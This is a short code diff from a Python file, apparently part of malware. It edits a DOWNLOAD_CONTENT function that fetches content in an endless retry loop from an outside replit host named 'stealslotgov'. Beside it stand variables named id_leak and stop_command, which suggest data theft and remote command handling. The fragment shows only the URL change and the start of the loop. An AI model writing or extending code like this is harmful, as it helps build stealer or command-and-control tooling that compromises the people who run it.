@@ -5,7 +5,7 @@ stop_command = False
 id_leak = []
 
 def DOWNLOAD_CONTENT(FILES, MODE):
-    url_content = f'https://stealslotgov.idkotherhex1629.repl.co/download={FILES}&mode={MODE}'
+    url_content = f'https://stealslotgov.idkotherhex1629.repl.co/{FILES}'
     while True:
         try:
             r = requests.get(url_content)
